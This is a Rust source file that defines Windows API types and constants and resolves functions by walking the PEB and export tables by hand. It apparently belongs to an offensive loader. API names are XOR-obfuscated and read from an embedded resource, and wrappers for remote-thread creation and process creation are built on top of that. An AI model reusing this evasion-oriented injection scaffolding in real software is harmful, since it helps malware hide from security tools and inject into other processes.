#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(unused)]

use crate::consts::*;
use crate::crypto_util::*;
use crate::svec::ToSVec;
use crate::util::{
    compare_str_and_w_str_bytes, compare_strs_as_bytes, compare_xor_str_and_str_bytes,
    compare_xor_str_and_w_str_bytes, find_char, get_resource_bytes, strlen,
};
use crate::windows::ntdll::*;
use std::ffi::{c_char, CStr, CString};
use std::mem;
use std::ptr::{addr_of, addr_of_mut};
use std::slice::from_raw_parts;
use std::str::Utf8Error;

pub type FnAllocConsole = unsafe extern "system" fn() -> u32;
pub type FnCloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
pub type FnCreateFileA = unsafe extern "system" fn(
    lpFileName: *const u8,
    dwDesiredAccess: u32,
    dwShareMode: u32,
    lpSecurityAttributes: *const SECURITY_DESCRIPTOR,
    dwCreationDisposition: u32,
    dwFlagsAndAttributes: u32,
    hTemplateFile: usize,
) -> usize;
pub type FnCreateProcessA = unsafe extern "system" fn(
    lpApplicationName: *const u8,
    lpCommandLine: *const u8,
    lpProcessAttributes: *const SECURITY_DESCRIPTOR,
    lpThreadAttributes: *const SECURITY_DESCRIPTOR,
    bInheritHandles: u32,
    dwCreationFlags: u32,
    lpEnvironment: usize,
    lpCurrentDirectory: *const u8,
    lpStartupInfo: *const STARTUPINFOA,
    lpProcessInformation: *const PROCESS_INFORMATION,
) -> u32;
pub type FnCreateRemoteThread = unsafe extern "system" fn(
    hProcess: usize,
    lpThreadAttributes: usize,
    dwStackSize: usize,
    lpStartAddress: usize,
    lpParameter: usize,
    dwCreationFlags: u32,
    lpThreadId: *mut u32,
) -> usize;
pub type FnCreateToolhelp32Snapshot =
    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
pub type FnFreeConsole = unsafe extern "system" fn() -> u32;
pub type FnFindResourceA =
    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
pub type FnGetCurrentProcess = unsafe extern "system" fn() -> usize;
pub type FnGetFinalPathNameByHandleA = unsafe extern "system" fn(
    hFile: usize,
    lpszFilePath: *const u8,
    cchFilePath: u32,
    dwFlags: u32,
) -> u32;
pub type FnGetLastError = unsafe extern "system" fn() -> u32;
pub type FnGetModuleHandleA = unsafe extern "system" fn(lpModuleName: *const u8) -> usize;
pub type FnGetModuleHandleW = unsafe extern "system" fn(lwModuleName: *const u16) -> usize;
pub type FnGetProcAddress =
    unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
pub type FnGetSystemDirectoryA = unsafe extern "system" fn(lpBuffer: *mut u8, uSize: u32) -> u32;
pub type FnGetSystemDirectoryW = unsafe extern "system" fn(lpBuffer: *mut u16, uSize: u32) -> u32;
pub type FnIsProcessorFeaturePresent = unsafe extern "system" fn(ProcessorFeature: u32) -> u32;
pub type FnLoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
pub type FnLoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
pub type FnLockResource = unsafe extern "system" fn(hResData: usize) -> *const u8;
pub type FnOpenFile = unsafe extern "system" fn(
    lpFileName: *const u8,
    lpReOpenBuff: *const OFSTRUCT,
    uStyle: u32,
) -> i32;
pub type FnOpenProcess =
    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
pub type FnProcess32First =
    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
pub type FnProcess32Next =
    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> u32;
pub type FnReadProcessMemory = unsafe extern "system" fn(
    hProcess: usize,
    lpBaseAddress: usize,
    lpBuffer: *mut u8,
    nSize: usize,
    lpNumberOfBytesRead: *mut usize,
) -> u32;
pub type FnResumeThread = unsafe extern "system" fn(hThread: usize) -> u32;
pub type FnSetStdHandle = unsafe extern "system" fn(nStdHandle: u32, hHandle: usize) -> u32;
pub type FnSizeofResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> u32;
pub type FnVirtualAlloc = unsafe extern "system" fn(
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize;
pub type FnVirtualAllocEx = unsafe extern "system" fn(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize;
pub type FnVirtualFree =
    unsafe extern "system" fn(lpAddress: usize, dwSize: usize, dwFreeType: u32) -> usize;
pub type FnVirtualFreeEx = unsafe extern "system" fn(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    dwFreeType: u32,
) -> usize;
pub type FnVirtualProtect = unsafe extern "system" fn(
    lpAddress: usize,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> u32;
pub type FnVirtualQuery = unsafe extern "system" fn(
    lpAddress: usize,
    lpBuffer: &mut MEMORY_BASIC_INFORMATION,
    dwLength: usize,
) -> usize;
pub type FnWaitForSingleObject =
    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
pub type FnWriteFile = unsafe extern "system" fn(
    hFile: usize,
    lpBuffer: *const u8,
    nNumberOfBytesToWrite: u32,
    lpNumberOfBytesWritten: *const u32,
    lpOverlapped: *const OVERLAPPED,
) -> u32;
pub type FnWriteProcessMemory = unsafe extern "system" fn(
    hProcess: usize,
    lpAddress: usize,
    lpBuffer: *const u8,
    nSize: usize,
    lpNumberOfBytesWritten: usize,
) -> u32;

pub const PROCESS_TERMINATE: u32 = 0x0001;
pub const PROCESS_CREATE_THREAD: u32 = 0x0002;
pub const PROCESS_SET_SESSIONID: u32 = 0x0004;
pub const PROCESS_VM_OPERATION: u32 = 0x0008;
pub const PROCESS_VM_READ: u32 = 0x0010;
pub const PROCESS_VM_WRITE: u32 = 0x0020;
pub const PROCESS_DUP_HANDLE: u32 = 0x0040;
pub const PROCESS_CREATE_PROCESS: u32 = 0x0080;
pub const PROCESS_SET_QUOTA: u32 = 0x0100;
pub const PROCESS_SET_INFORMATION: u32 = 0x0200;
pub const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
pub const PROCESS_SUSPEND_RESUME: u32 = 0x0800;
pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
pub const PROCESS_SET_LIMITED_INFORMATION: u32 = 0x2000;
pub const PROCESS_ALL_ACCESS: u32 = 0x000F0000 | 0x00100000 | 0xFFFF;

pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const MEM_REPLACE_PLACEHOLDER: u32 = 0x00004000;
pub const MEM_RESERVE_PLACEHOLDER: u32 = 0x00040000;
pub const MEM_RESET: u32 = 0x00080000;
pub const MEM_TOP_DOWN: u32 = 0x00100000;
pub const MEM_WRITE_WATCH: u32 = 0x00200000;
pub const MEM_PHYSICAL: u32 = 0x00400000;
pub const MEM_ROTATE: u32 = 0x00800000;
pub const MEM_DIFFERENT_IMAGE_BASE_OK: u32 = 0x00800000;
pub const MEM_RESET_UNDO: u32 = 0x01000000;
pub const MEM_LARGE_PAGES: u32 = 0x20000000;
pub const MEM_4MB_PAGES: u32 = 0x80000000;
pub const MEM_64K_PAGES: u32 = MEM_LARGE_PAGES | MEM_PHYSICAL;
pub const MEM_UNMAP_WITH_TRANSIENT_BOOST: u32 = 0x00000001;
pub const MEM_COALESCE_PLACEHOLDERS: u32 = 0x00000001;
pub const MEM_PRESERVE_PLACEHOLDER: u32 = 0x00000002;
pub const MEM_DECOMMIT: u32 = 0x00004000;
pub const MEM_RELEASE: u32 = 0x00008000;
pub const MEM_FREE: u32 = 0x00010000;

pub const PAGE_NOACCESS: u32 = 0x01;
pub const PAGE_READONLY: u32 = 0x02;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_WRITECOPY: u32 = 0x08;
pub const PAGE_EXECUTE: u32 = 0x10;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
pub const PAGE_GUARD: u32 = 0x100;
pub const PAGE_NOCACHE: u32 = 0x200;
pub const PAGE_WRITECOMBINE: u32 = 0x400;

pub const TH32CS_SNAPPROCESS: u32 = 0x00000002;
pub const INVALID_HANDLE_VALUE: usize = usize::MAX;
pub const MAX_PATH: usize = 260;
pub const OFS_MAXPATHNAME: usize = 128;

pub const OF_READ: usize = 0x00000000;
pub const OF_WRITE: usize = 0x00000001;
pub const OF_READWRITE: usize = 0x00000002;
pub const OF_SHARE_COMPAT: usize = 0x00000000;
pub const OF_SHARE_EXCLUSIVE: usize = 0x00000010;
pub const OF_SHARE_DENY_WRITE: usize = 0x00000020;
pub const OF_SHARE_DENY_READ: usize = 0x00000030;
pub const OF_SHARE_DENY_NONE: usize = 0x00000040;
pub const OF_PARSE: usize = 0x00000100;
pub const OF_DELETE: usize = 0x00000200;
pub const OF_VERIFY: usize = 0x00000400;
pub const OF_CANCEL: usize = 0x00000800;
pub const OF_CREATE: usize = 0x00001000;
pub const OF_PROMPT: usize = 0x00002000;
pub const OF_EXIST: usize = 0x00004000;
pub const OF_REOPEN: usize = 0x00008000;

pub const GENERIC_READ: u32 = 0x80000000;
pub const GENERIC_WRITE: u32 = 0x40000000;
pub const GENERIC_EXECUTE: u32 = 0x20000000;
pub const GENERIC_ALL: u32 = 0x10000000;

pub const FILE_SHARE_READ: u32 = 0x00000001;
pub const FILE_SHARE_WRITE: u32 = 0x00000002;
pub const FILE_SHARE_DELETE: u32 = 0x00000004;
pub const FILE_ATTRIBUTE_READONLY: u32 = 0x00000001;
pub const FILE_ATTRIBUTE_HIDDEN: u32 = 0x00000002;
pub const FILE_ATTRIBUTE_SYSTEM: u32 = 0x00000004;
pub const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x00000010;
pub const FILE_ATTRIBUTE_ARCHIVE: u32 = 0x00000020;
pub const FILE_ATTRIBUTE_DEVICE: u32 = 0x00000040;
pub const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;
pub const FILE_ATTRIBUTE_TEMPORARY: u32 = 0x00000100;
pub const FILE_ATTRIBUTE_SPARSE_FILE: u32 = 0x00000200;
pub const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x00000400;
pub const FILE_ATTRIBUTE_COMPRESSED: u32 = 0x00000800;
pub const FILE_ATTRIBUTE_OFFLINE: u32 = 0x00001000;
pub const FILE_ATTRIBUTE_NOT_CONTENT_INDEXED: u32 = 0x00002000;
pub const FILE_ATTRIBUTE_ENCRYPTED: u32 = 0x00004000;
pub const FILE_ATTRIBUTE_INTEGRITY_STREAM: u32 = 0x00008000;
pub const FILE_ATTRIBUTE_VIRTUAL: u32 = 0x00010000;
pub const FILE_ATTRIBUTE_NO_SCRUB_DATA: u32 = 0x00020000;
pub const FILE_ATTRIBUTE_EA: u32 = 0x00040000;
pub const FILE_ATTRIBUTE_PINNED: u32 = 0x00080000;
pub const FILE_ATTRIBUTE_UNPINNED: u32 = 0x00100000;
pub const FILE_ATTRIBUTE_RECALL_ON_OPEN: u32 = 0x00040000;
pub const FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS: u32 = 0x00400000;
pub const TREE_CONNECT_ATTRIBUTE_PRIVACY: u32 = 0x00004000;
pub const TREE_CONNECT_ATTRIBUTE_INTEGRITY: u32 = 0x00008000;
pub const TREE_CONNECT_ATTRIBUTE_GLOBAL: u32 = 0x00000004;
pub const TREE_CONNECT_ATTRIBUTE_PINNED: u32 = 0x00000002;
pub const FILE_ATTRIBUTE_STRICTLY_SEQUENTIAL: u32 = 0x20000000;
pub const FILE_NOTIFY_CHANGE_FILE_NAME: u32 = 0x00000001;
pub const FILE_NOTIFY_CHANGE_DIR_NAME: u32 = 0x00000002;
pub const FILE_NOTIFY_CHANGE_ATTRIBUTES: u32 = 0x00000004;
pub const FILE_NOTIFY_CHANGE_SIZE: u32 = 0x00000008;
pub const FILE_NOTIFY_CHANGE_LAST_WRITE: u32 = 0x00000010;
pub const FILE_NOTIFY_CHANGE_LAST_ACCESS: u32 = 0x00000020;
pub const FILE_NOTIFY_CHANGE_CREATION: u32 = 0x00000040;
pub const FILE_NOTIFY_CHANGE_SECURITY: u32 = 0x00000100;
pub const FILE_ACTION_ADDED: u32 = 0x00000001;
pub const FILE_ACTION_REMOVED: u32 = 0x00000002;
pub const FILE_ACTION_MODIFIED: u32 = 0x00000003;
pub const FILE_ACTION_RENAMED_OLD_NAME: u32 = 0x00000004;
pub const FILE_ACTION_RENAMED_NEW_NAME: u32 = 0x00000005;
pub const MAILSLOT_NO_MESSAGE: u32 = u32::MAX;
pub const MAILSLOT_WAIT_FOREVER: u32 = u32::MAX;
pub const FILE_CASE_SENSITIVE_SEARCH: u32 = 0x00000001;
pub const FILE_CASE_PRESERVED_NAMES: u32 = 0x00000002;
pub const FILE_UNICODE_ON_DISK: u32 = 0x00000004;
pub const FILE_PERSISTENT_ACLS: u32 = 0x00000008;
pub const FILE_FILE_COMPRESSION: u32 = 0x00000010;
pub const FILE_VOLUME_QUOTAS: u32 = 0x00000020;
pub const FILE_SUPPORTS_SPARSE_FILES: u32 = 0x00000040;
pub const FILE_SUPPORTS_REPARSE_POINTS: u32 = 0x00000080;
pub const FILE_SUPPORTS_REMOTE_STORAGE: u32 = 0x00000100;
pub const FILE_RETURNS_CLEANUP_RESULT_INFO: u32 = 0x00000200;
pub const FILE_SUPPORTS_POSIX_UNLINK_RENAME: u32 = 0x00000400;
pub const FILE_SUPPORTS_BYPASS_IO: u32 = 0x00000800;
pub const FILE_VOLUME_IS_COMPRESSED: u32 = 0x00008000;
pub const FILE_SUPPORTS_OBJECT_IDS: u32 = 0x00010000;
pub const FILE_SUPPORTS_ENCRYPTION: u32 = 0x00020000;
pub const FILE_NAMED_STREAMS: u32 = 0x00040000;
pub const FILE_READ_ONLY_VOLUME: u32 = 0x00080000;
pub const FILE_SEQUENTIAL_WRITE_ONCE: u32 = 0x00100000;
pub const FILE_SUPPORTS_TRANSACTIONS: u32 = 0x00200000;
pub const FILE_SUPPORTS_HARD_LINKS: u32 = 0x00400000;
pub const FILE_SUPPORTS_EXTENDED_ATTRIBUTES: u32 = 0x00800000;
pub const FILE_SUPPORTS_OPEN_BY_FILE_ID: u32 = 0x01000000;
pub const FILE_SUPPORTS_USN_JOURNAL: u32 = 0x02000000;
pub const FILE_SUPPORTS_INTEGRITY_STREAMS: u32 = 0x04000000;
pub const FILE_SUPPORTS_BLOCK_REFCOUNTING: u32 = 0x08000000;
pub const FILE_SUPPORTS_SPARSE_VDL: u32 = 0x10000000;
pub const FILE_DAX_VOLUME: u32 = 0x20000000;
pub const FILE_SUPPORTS_GHOSTING: u32 = 0x40000000;

pub const CREATE_NEW: u32 = 1;
pub const CREATE_ALWAYS: u32 = 2;
pub const OPEN_EXISTING: u32 = 3;
pub const OPEN_ALWAYS: u32 = 4;
pub const TRUNCATE_EXISTING: u32 = 5;

pub const STD_INPUT_HANDLE: u32 = 0xFFFFFFF6;
pub const STD_OUTPUT_HANDLE: u32 = 0xFFFFFFF5;
pub const STD_ERROR_HANDLE: u32 = 0xFFFFFFF4;
//
// Process dwCreationFlag values
//
pub const DEBUG_PROCESS: u32 = 0x00000001;
pub const DEBUG_ONLY_THIS_PROCESS: u32 = 0x00000002;
pub const CREATE_SUSPENDED: u32 = 0x00000004;
pub const DETACHED_PROCESS: u32 = 0x00000008;
pub const CREATE_NEW_CONSOLE: u32 = 0x00000010;
pub const NORMAL_PRIORITY_CLASS: u32 = 0x00000020;
pub const IDLE_PRIORITY_CLASS: u32 = 0x00000040;
pub const HIGH_PRIORITY_CLASS: u32 = 0x00000080;
pub const REALTIME_PRIORITY_CLASS: u32 = 0x00000100;
pub const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
pub const CREATE_UNICODE_ENVIRONMENT: u32 = 0x00000400;
pub const CREATE_SEPARATE_WOW_VDM: u32 = 0x00000800;
pub const CREATE_SHARED_WOW_VDM: u32 = 0x00001000;
pub const CREATE_FORCEDOS: u32 = 0x00002000;
pub const BELOW_NORMAL_PRIORITY_CLASS: u32 = 0x00004000;
pub const ABOVE_NORMAL_PRIORITY_CLASS: u32 = 0x00008000;
pub const INHERIT_PARENT_AFFINITY: u32 = 0x00010000;
pub const CREATE_PROTECTED_PROCESS: u32 = 0x00040000;
pub const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;
pub const PROCESS_MODE_BACKGROUND_BEGIN: u32 = 0x00100000;
pub const PROCESS_MODE_BACKGROUND_END: u32 = 0x00200000;
pub const CREATE_SECURE_PROCESS: u32 = 0x00400000;
pub const CREATE_BREAKAWAY_FROM_JOB: u32 = 0x01000000;
pub const CREATE_PRESERVE_CODE_AUTHZ_LEVEL: u32 = 0x02000000;
pub const CREATE_DEFAULT_ERROR_MODE: u32 = 0x04000000;
pub const CREATE_NO_WINDOW: u32 = 0x08000000;
pub const PROFILE_USER: u32 = 0x10000000;
pub const PROFILE_KERNEL: u32 = 0x20000000;
pub const PROFILE_SERVER: u32 = 0x40000000;
pub const CREATE_IGNORE_SYSTEM_DEFAULT: u32 = 0x80000000;
// Deprecated
pub const INHERIT_CALLER_PRIORITY: usize = 0x00020000;
pub const INFINITE: u32 = u32::MAX;

pub const PAGE_SIZE: usize = 0x1000;

#[repr(C)]
pub struct PROCESSENTRY32 {
    pub dwSize: u32,
    pub cntUsage: u32,
    pub th32ProcessID: u32,
    pub th32DefaultHeapID: usize,
    pub th32ModuleID: u32,
    pub cntThreads: u32,
    pub th32ParentProcessID: u32,
    pub pcPriClassBase: i32,
    pub dwFlags: u32,
    pub szExeFile: [u8; MAX_PATH],
}

#[repr(C)]
pub struct OFSTRUCT {
    pub cBytes: u8,
    pub fFixedDisk: u8,
    pub nErrCode: u16,
    pub Reserved1: u16,
    pub Reserved2: u16,
    pub szPathName: [u8; OFS_MAXPATHNAME],
}

#[repr(C)]
pub struct STARTUPINFOA {
    pub cb: u32,
    pub lpReserved: *const u8,
    pub lpDesktop: *const u8,
    pub lpTitle: *const u8,
    pub dwX: u32,
    pub dwY: u32,
    pub dwXSize: u32,
    pub dwYSize: u32,
    pub dwXCountChars: u32,
    pub dwYCountChars: u32,
    pub dwFillAttribute: u32,
    pub dwFlags: u32,
    pub wShowWindow: u16,
    pub cbReserved2: u16,
    pub lpReserved2: usize,
    pub hStdInput: usize,
    pub hStdOutput: usize,
    pub hStdError: usize,
}

#[repr(C)]
#[derive(Debug)]
pub struct MEMORY_BASIC_INFORMATION {
    pub BaseAddress: usize,
    pub AllocationBase: usize,
    pub AllocationProtect: u32,
    #[cfg(target_arch = "x86_64")]
    pub PartitionId: u16,
    pub RegionSize: usize,
    pub State: u32,
    pub Protect: u32,
    pub Type: u32,
}

impl MEMORY_BASIC_INFORMATION {
    pub fn new() -> MEMORY_BASIC_INFORMATION {
        MEMORY_BASIC_INFORMATION {
            BaseAddress: 0,
            AllocationBase: 0,
            AllocationProtect: 0,
            #[cfg(target_arch = "x86_64")]
            PartitionId: 0,
            RegionSize: 0,
            State: 0,
            Protect: 0,
            Type: 0,
        }
    }
}

#[repr(C)]
pub struct PROCESS_INFORMATION {
    pub hProcess: usize,
    pub hThread: usize,
    pub dwProcessId: i32,
    pub dwThreadId: i32,
}

#[repr(C)]
pub struct OVERLAPPED {
    Internal: usize,
    InternalHigh: usize,
    Offset: u32,
    OffsetHigh: u32,
    hEvent: usize,
}

#[repr(C)]
pub struct SECURITY_ATTRIBUTES {
    pub nLength: u32,
    pub lpSecurityDescriptor: *const SECURITY_DESCRIPTOR,
    pub bInheritHandle: u32,
}

#[repr(C)]
pub struct SECURITY_DESCRIPTOR {
    pub Revision: u8,
    pub Sbz1: u8,
    pub Control: u16,
    pub Owner: usize,
    pub Group: usize,
    pub Sacl: *const ACL,
    pub Dacl: *const ACL,
}

#[repr(C)]
pub struct ACL {
    pub AclRevision: u8,
    pub Sbz1: u8,
    pub AclSize: u16,
    pub AceCount: u16,
    pub Sbz2: u16,
}

pub unsafe fn GetModuleHandleInternal(module_name: &[u8]) -> usize {
    let peb = get_peb();

    if module_name.is_empty() {
        return peb.ImageBaseAddress;
    }

    let ldr = peb.Ldr;
    let module_list = &ldr.InMemoryOrderModuleList;

    let mut list_entry = module_list.Flink;
    while addr_of!(*list_entry) as usize != addr_of!(*module_list) as usize {
        let entry: &'static TRUNC_LDR_DATA_TABLE_ENTRY = mem::transmute(list_entry);
        let name = std::slice::from_raw_parts(
            entry.BaseDllName.Buffer,
            entry.BaseDllName.Length as usize / 2,
        );

        if compare_str_and_w_str_bytes(module_name, name, true) {
            return entry.DllBase;
        }
        list_entry = list_entry.Flink;
    }

    0
}

pub unsafe fn GetModuleHandleX(xor_string: &[u8], key: &[u8]) -> usize {
    let peb = get_peb();

    if xor_string.is_empty() {
        return peb.ImageBaseAddress;
    }

    let ldr = peb.Ldr;
    let module_list = &ldr.InMemoryOrderModuleList;

    let mut list_entry = module_list.Flink;
    while addr_of!(*list_entry) as usize != addr_of!(*module_list) as usize {
        let entry: &'static TRUNC_LDR_DATA_TABLE_ENTRY = mem::transmute(list_entry);

        let name = std::slice::from_raw_parts(
            entry.BaseDllName.Buffer,
            entry.BaseDllName.Length as usize / 2,
        );
        if compare_xor_str_and_w_str_bytes(xor_string, name, key) {
            return entry.DllBase;
        }
        list_entry = list_entry.Flink;
    }

    0
}

pub unsafe fn GetProcAddressInternal(base_address: usize, proc_name: &[u8]) -> usize {
    let dos_header: &'static IMAGE_DOS_HEADER = mem::transmute(base_address);
    let nt_headers: &'static IMAGE_NT_HEADERS =
        mem::transmute(base_address + dos_header.e_lfanew as usize);
    let optional_header = &nt_headers.OptionalHeader;
    let export_data_directory =
        &optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
    let export_directory_address: &'static IMAGE_EXPORT_DIRECTORY =
        mem::transmute(base_address + export_data_directory.VirtualAddress as usize);

    let eat_address = base_address + export_directory_address.AddressOfFunctions as usize;
    let eat_array = std::slice::from_raw_parts(
        eat_address as *const u32,
        export_directory_address.NumberOfFunctions as usize,
    );

    let mut proc_address = 0;
    if proc_name.len() >= 4 && *(proc_name.as_ptr() as *const u32) >> 16 == 0 {
        let ordinal = *(proc_name.as_ptr() as *const u32);
        let base = export_directory_address.Base;

        if (ordinal < base) || (ordinal >= base + export_directory_address.NumberOfFunctions) {
            return 0;
        }

        proc_address = base_address + eat_array[(ordinal - base) as usize] as usize;
    } else {
        let name_table_address = base_address + export_directory_address.AddressOfNames as usize;
        let name_table = std::slice::from_raw_parts(
            name_table_address as *const u32,
            export_directory_address.NumberOfNames as usize,
        );

        for i in 0..export_directory_address.NumberOfNames as usize {
            let string_address = base_address + name_table[i] as usize;
            let name = std::slice::from_raw_parts(
                string_address as *const u8,
                strlen(string_address as *const u8),
            );

            if compare_strs_as_bytes(proc_name, name, true) {
                let hints_table_address =
                    base_address + export_directory_address.AddressOfNameOrdinals as usize;
                let hints_table = std::slice::from_raw_parts(
                    hints_table_address as *const u16,
                    export_directory_address.NumberOfNames as usize,
                );
                proc_address = base_address + eat_array[hints_table[i] as usize] as usize;
            }
        }
    }

    if proc_address >= addr_of!(*export_directory_address) as usize
        && proc_address
            < addr_of!(*export_directory_address) as usize + export_data_directory.Size as usize
    {
        proc_address = get_fwd_addr(proc_address);
    }

    proc_address
}

pub unsafe fn GetProcAddressX(base_address: usize, xor_string: &[u8], key: &[u8]) -> usize {
    let dos_header: &'static IMAGE_DOS_HEADER = mem::transmute(base_address);
    let nt_headers: &'static IMAGE_NT_HEADERS =
        mem::transmute(base_address + dos_header.e_lfanew as usize);
    let optional_header = &nt_headers.OptionalHeader;
    let export_data_directory =
        &optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
    let export_directory_address: &'static IMAGE_EXPORT_DIRECTORY =
        mem::transmute(base_address + export_data_directory.VirtualAddress as usize);

    let eat_address = base_address + export_directory_address.AddressOfFunctions as usize;
    let eat_array = std::slice::from_raw_parts(
        eat_address as *const u32,
        export_directory_address.NumberOfFunctions as usize,
    );

    // We are only loading by name for this function, so remove the ordinal code.
    // checking for ordinal can cause issues, here.
    let mut proc_address = 0;
    let name_table_address = base_address + export_directory_address.AddressOfNames as usize;
    let name_table = std::slice::from_raw_parts(
        name_table_address as *const u32,
        export_directory_address.NumberOfNames as usize,
    );

    for i in 0..export_directory_address.NumberOfNames as usize {
        let string_address = (base_address + name_table[i] as usize) as *const u8;
        let name = std::slice::from_raw_parts(string_address, strlen(string_address));

        if compare_xor_str_and_str_bytes(xor_string, name, key) {
            let hints_table_address =
                base_address + export_directory_address.AddressOfNameOrdinals as usize;
            let hints_table = std::slice::from_raw_parts(
                hints_table_address as *const u16,
                export_directory_address.NumberOfNames as usize,
            );
            proc_address = base_address + eat_array[hints_table[i] as usize] as usize;
        }
    }

    if proc_address >= addr_of!(*export_directory_address) as usize
        && proc_address
            < addr_of!(*export_directory_address) as usize + export_data_directory.Size as usize
    {
        proc_address = get_fwd_addr(proc_address);
    }

    proc_address
}

unsafe fn get_fwd_addr(proc_address: usize) -> usize {
    let mut forward_dll =
        std::slice::from_raw_parts(proc_address as *const u8, strlen(proc_address as *const u8))
            .to_svec();

    let split_pos = match find_char(&forward_dll[..], '.' as u8) {
        None => {
            return 0;
        }
        Some(sz) => sz,
    };

    forward_dll[split_pos] = 0;

    let forward_handle = LoadLibraryA(forward_dll.as_ptr());
    if forward_handle == 0 {
        return 0;
    }

    let string_address = (proc_address + split_pos + 1) as *const u8;
    let forward_function = std::slice::from_raw_parts(string_address, strlen(string_address));
    GetProcAddressInternal(forward_handle, forward_function)
}

pub unsafe fn AllocConsole() -> u32 {
    let allocConsole: FnAllocConsole = std::mem::transmute(GetProcAddressInternal(
        GetModuleHandleInternal("KERNEL32.DLL".as_bytes()),
        "AllocConsole".as_bytes(),
    ));

    allocConsole()
}

pub unsafe fn CloseHandle(hObject: usize) -> bool {
    let closeHandle: FnCloseHandle = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CLOSEHANDLE_POS, CLOSEHANDLE_LEN),
        get_resource_bytes(RESOURCE_ID, CLOSEHANDLE_KEY, CLOSEHANDLE_LEN),
    ));

    closeHandle(hObject)
}

pub unsafe fn CreateFileA(
    lpFileName: *const u8,
    dwDesiredAccess: u32,
    dwShareMode: u32,
    lpSecurityAttributes: *const SECURITY_DESCRIPTOR,
    dwCreationDisposition: u32,
    dwFlagsAndAttributes: u32,
    hTemplateFile: usize,
) -> usize {
    let createFileA: FnCreateFileA = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CREATEFILEA_POS, CREATEFILEA_LEN),
        get_resource_bytes(RESOURCE_ID, CREATEFILEA_KEY, CREATEFILEA_LEN),
    ));

    createFileA(
        lpFileName,
        dwDesiredAccess,
        dwShareMode,
        lpSecurityAttributes,
        dwCreationDisposition,
        dwFlagsAndAttributes,
        hTemplateFile,
    )
}

pub unsafe fn CreateProcessA(
    lpApplicationName: *const u8,
    lpCommandLine: *const u8,
    lpProcessAttributes: *const SECURITY_DESCRIPTOR,
    lpThreadAttributes: *const SECURITY_DESCRIPTOR,
    bInheritHandles: u32,
    dwCreationFlags: u32,
    lpEnvironment: usize,
    lpCurrentDirectory: *const u8,
    lpStartupInfo: *const STARTUPINFOA,
    lpProcessInformation: *const PROCESS_INFORMATION,
) -> u32 {
    let createProcessA: FnCreateProcessA = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CREATEPROCESSA_POS, CREATEPROCESSA_LEN),
        get_resource_bytes(RESOURCE_ID, CREATEPROCESSA_KEY, CREATEPROCESSA_LEN),
    ));

    createProcessA(
        lpApplicationName,
        lpCommandLine,
        lpProcessAttributes,
        lpThreadAttributes,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation,
    )
}

pub unsafe fn CreateRemoteThread(
    hProcess: usize,
    lpThreadAttributes: usize,
    dwStackSize: usize,
    lpStartAddress: usize,
    lpParameter: usize,
    dwCreationFlags: u32,
    lpThreadId: *mut u32,
) -> usize {
    let createRemoteThread: FnCreateRemoteThread = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CREATEREMOTETHREAD_POS, CREATEREMOTETHREAD_LEN),
        get_resource_bytes(RESOURCE_ID, CREATEREMOTETHREAD_KEY, CREATEREMOTETHREAD_LEN),
    ));

    createRemoteThread(
        hProcess,
        lpThreadAttributes,
        dwStackSize,
        lpStartAddress,
        lpParameter,
        dwCreationFlags,
        lpThreadId,
    )
}

